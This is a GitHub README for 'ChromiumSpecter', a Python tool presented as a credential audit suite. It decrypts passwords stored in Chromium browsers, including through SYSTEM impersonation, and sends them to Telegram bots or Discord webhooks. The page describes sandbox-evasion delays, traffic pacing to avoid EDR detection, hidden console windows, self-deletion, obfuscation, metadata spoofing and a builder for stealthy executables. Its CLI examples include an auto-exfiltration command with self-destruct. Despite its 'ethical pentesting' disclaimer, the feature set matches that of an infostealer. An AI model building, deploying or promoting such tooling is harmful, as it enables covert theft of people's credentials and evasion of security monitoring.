# 🛡️ ChromiumSpecter Auditor Suite `v2.6.0` (V20 Stable)

> [!NOTE]
> **English Version** | [Versión en Español](README.md)

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*The ultimate tactical-grade suite for security audits on Chromium-based browsers (Chrome, Edge, Brave, Vivaldi, Opera, Opera GX).*

[Report Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Request Feature](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)

</div>

---

<div align="center">
  <img src="screenshots/dashboard.png" width="800" alt="ChromiumSpecter Dashboard">
</div>

---

### 📐 Architecture Comparison: CNG Impersonation vs. Code Injection

ChromiumSpecter implements a direct decryption engine using SYSTEM impersonation. Unlike other tactical tools in the industry such as [Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption.git) (C++), which rely on noisy in-memory code injection, our architecture prioritizes operational stability and defensive stealth.

| Feature | CNG Impersonation + SYSTEM (ChromiumSpecter) | COM + Injection Approach (C++ - Chrome-App-Bound-Encryption-Decryption) |
| :--- | :--- | :--- |
| **Privilege Requirement** | Requires Administrator privileges (to impersonate `winlogon` and enable `SeDebugPrivilege`). | **ADVANTAGE:** Does not require elevated privileges (runs under standard user context). |
| **Evasion Profile (AV / EDR)** | **ADVANTAGE:** Extremely silent. Does not inject code, create suspended processes, or modify third-party memory. Relies purely on legitimate Windows Cryptographic APIs (`ncrypt.dll`). | **CRITICAL:** Noisy. DLL injection, Process Hollowing, and Direct Syscalls are highly monitored and blocked by modern EDRs. |
| **Resistance to Updates** | **ADVANTAGE:** Highly resilient. As long as the browser registers the key under the same KSP name in Windows, decryption works regardless of changes in the COM interfaces. | **DISADVANTAGE:** Fragile. Changes to the browser's internal interfaces (such as the transition to `IElevator2` in Chrome 144) break C++ stubs and require frequent rewrites. |
| **Code Complexity** | **ADVANTAGE:** Low complexity. Pure Win32 API interaction logic via Python's standard `ctypes`. | **DISADVANTAGE:** Extremely high complexity. Requires custom in-memory PE loaders, VTable offset mapping, and dedicated COM stubs for each browser. |

## 💻 Capabilities Overview

**ChromiumSpecter** is a credential auditing suite designed for Windows environments, focusing on discretion, automation, and operational ergonomics. It allows for the extraction, decryption, and exfiltration of data from Chromium-based browsers (v80+) with a modular and resilient architecture.

### 🌟 Key Features

* **🖥️ High-Density Dashboard**: Professional graphical interface with real-time consoles, dynamic statistics, and result management.
* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.6.0`**:
  * Full native support for **Chrome v127+, Edge v127+, and Brave v130+ (App-Bound Encryption)** via the `v20_decryptor` module.
  * Hybrid Decryption: Supports **AES-GCM (v10/v11)**, **DPAPI Legacy**, and the new **v20** scheme simultaneously in the same database.
  * **Brave Direct Key Support**: Automatically maps 32-byte direct key payloads without complex nested encryption flags.
  * **Intelligent Synchronization**: The engine now uses dynamic imports to survive obfuscators and ensure portability.
  * **Privilege Escalation**: Implements native SYSTEM impersonation (via `winlogon.exe`) to extract system-protected keys. **(Requires running as Administrator)**.
  * Smart detection: The engine identifies the prefix (`v10`, `v11`, `v20`) and applies the corresponding algorithm with automatic fallback.
* **🕵️ Tactical Stealth Engine**:
  * **Startup Delay**: Initial delay selector (0-300s) to evade analysis in Sandboxes.
  * **Inter-file Delay (`send_delay`)**: Customizable pauses between sends to prevent traffic spikes that alert firewalls or EDRs.
  * **Anti-Forensics**: Support for **Tactical Self-Destruct** (Auto-Delete) of the binary after execution.
  * **Panic Protocol**: Total audit environment sanitization with a single click.
* **🧠 Smart Profile Detection**:
  * Differentiated scanning and integrated premium UI styling (brand-tailored color badges for Chrome, Edge, Brave, Vivaldi, Opera, and Opera GX).
  * File size validation before processing (avoids false positives with empty DBs).
  * `PermissionError` handling per profile without aborting the full scan.

<div align="center">
  <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
</div>

### 🚀 Smart Exfiltration

* **Auto-Exfiltration**: Configuration for immediate automatic sending after auditing.
* **Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
* **Local Persistence**: Secure saving of exfiltration configurations for recurring use.

### 🛠️ Integrated Visual Builder `v2.6.0`

Custom stub generation with **Dynamic Parameter Injection**.
**Universal Dependency Injection**: The builder now automatically parses `requirements.txt` and resolves dependencies at compile time.
**Metadata Spoofing**: Built-in presets to clone signatures.
**Compression and Obfuscation**: Native support for UPX and PyArmor.

<div align="center">
  <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
</div>

---

## 🚀 Tactical Workflow

1. **Configuration**: Define your Telegram/Discord tokens in the **Exfiltration** Tab and save them.
2. **Audit**: Launch the scan from the Dashboard. You can activate **Auto-exfiltration** and **Self-destruct** for a "fire and forget" cycle.
3. **Inspection**: Visualize decrypted credentials in real-time in the **Results** Tab.
4. **Deployment**: Use the **Builder** to generate an `.exe` with your embedded credentials (Base64) and configured stealth presets.

## 🖥️ Advanced Usage (CLI)

The main engine (`main.py`) can be run independently without the GUI, ideal for automation or quick terminal deployments.

> [!IMPORTANT]
> **PRIVILEGE REQUIREMENT**: To decrypt **Chrome, Edge, and Brave v127+ (V20)** profiles, it is **MANDATORY** to run the terminal (or the `.exe`) with **Administrator privileges**. Without these privileges, the engine will be unable to perform the SYSTEM impersonation required to access the CNG key store.

```bash
# Basic audit
python main.py

# Audit with automatic exfiltration to Discord
python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct

# Silent audit (no console) and save to custom folder
python main.py --stealth --output-dir "C:\temp\logs"
```

### Available Parameters (CLI)

| Group | Parameter | Description |
| :--- | :--- | :--- |
| **Exfiltration** | `--webhook` | Discord Webhook URL for report sending. |
| | `--tg-token` | Telegram bot token. |
| | `--tg-chat-id` | Telegram chat or channel ID. |
| | `--no-exfil` | Disables external data sending. |
| **Reports** | `--no-html` | Does not generate the visual HTML report. |
| | `--no-csv` | Does not generate the structured CSV report. |
| | `--json` | Generates an additional report in JSON format. |
| | `--output-dir` | Output folder (default: `.audit`). |
| **Engine** | `--browser` | Filters by a specific browser (chrome, brave, etc). |
| | `--delay` | Initial delay (seconds) before acting. |
| | `--stealth` | **Stealth Mode**: Hides the console window immediately upon startup (via Windows API). |
| | `--auto-kill` | Automatically closes browsers if the database is locked. |
| | `--self-destruct` | **Deletes the executable** after the cycle finishes. |
| | `--no-wipe` | Does not delete local reports after sending. |
| | `--clean` | Cleans all old reports in the output folder. |
| | `--debug` | Shows detailed debugging logs. |

---

## ⚙️ Compilation Parameters (Stub)

When using the **Builder**, you can inject the following behaviors into your final binary. Options marked with 📡 are only available when the source file is `main.py` or a copy of it.

| Parameter | Range / Option | Purpose |
| :--- | :--- | :--- |
| **Initial Delay** | 0s - 3600s | Delay before the first action (Anti-Sandbox). |
| **Send Delay** | 0s - 60s | Pause between sent files (Traffic evasion). |
| **Webhook Timeout** | 1s - 300s | Timeout for unstable connections. |
| **📡 Auto-Exfiltrate** | Checkbox | Enables automatic sending without intervention upon execution. |
| **📡 Stealth Mode** | Runtime Flag | Hides the console upon startup (via `ShowWindow` Win32 API). |
| **💥 Self-Destruct** | Checkbox | Deletes the `.exe` after the cycle finishes. |
| **UAC Prompt** | Toggle | Requests administrator privileges if necessary. |
| **Obfuscate with PyArmor** | Toggle | Applies obfuscation to the source code before compiling. |
| **UPX Compression** | Toggle | Compresses the final binary (reduces size ~30-50%). |
| **Show Console** | Compiler Flag | Generates a `Console App`. If unchecked, generates an invisible `Windowed App`. |

> [!TIP]
> **Technical Difference — Show Console vs Stealth Mode**:
> - **Show Console** (Compiler): Determines if the **Operating System** creates the window from scratch. Unchecked = `Windowed App`, there is never a black window.
> - **Stealth Mode** (Runtime): The window is created, but the code hides it in milliseconds with `ShowWindow(0)`. A brief flash may be seen.
> - **Recommendation**: Leave "Show Console" **unchecked** + "Stealth Mode" **checked** for double layer of stealth.

---

## 🛠️ Tech Stack

| Component | Technology |
| :--- | :--- |
| **Core UI** | `CustomTkinter` (Modern Dark Theme) |
| **Cryptography** | `v20 (App-Bound)`, `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` + `SYSTEM Token Impersonation` |
| **OS Security** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`, `DuplicateTokenEx`, `ImpersonateLoggedOnUser`) |
| **Compilation** | `PyInstaller` + `PyArmor` + `UPX` |
| **Persistence** | Local `JSON` (`.audit/exfil_config.json`) |
| **Testing** | `pytest` + `pytest-mock` (22 tests, 0 failures) |

---

## ⚙️ Installation Guide

```bash
# 1. Clone the repository
git clone https://github.com/ANONIMO432HZ/ChromiumSpecter
cd ChromiumSpecter

# 2. Install dependencies
pip install -r requirements.txt

# 3. Launch the Dashboard
python gui_app.py
```

---

## 📡 Exfiltration Setup

### 🤖 Telegram

Requires **Token** and **Chat ID**.

* Get the token with `@BotFather`.
* Get your ID with `@userinfobot`.

### 🎮 Discord

Requires **Webhook URL**.

* Set it up in: Channel Settings -> Integrations -> Webhooks.

---

## 🧪 Quality and Testing

The suite includes a battery of automated tests to ensure the integrity of decryption algorithms and exfiltration channels.

To run the tests, make sure you have the virtual environment activated and run:

```bash
# Run all tests
pytest

# Run with detailed report
pytest -v
```

> [!TIP]
> Tests use `pytest-mock` to simulate network calls and system file access, allowing for safe validations without the risk of real exfiltration during testing.

---

## ⚖️ License and Ethical Use

### License
This project is licensed under the **GNU General Public License v3.0 (GPLv3)**. This means you can use, modify, and distribute the software, but any derivative work must also be open-source under the same license and **must give explicit credit to the original author (ANONIMO432HZ)**. See the [LICENSE](LICENSE) file for more details.

> [!CAUTION]
> **THIS SOFTWARE IS FOR ETHICAL PENTESTING AND PROFESSIONAL AUDITING PURPOSES.**
> Using this tool to access systems without the explicit authorization of the owner is illegal. The author assumes no responsibility for the misuse of this suite.

---
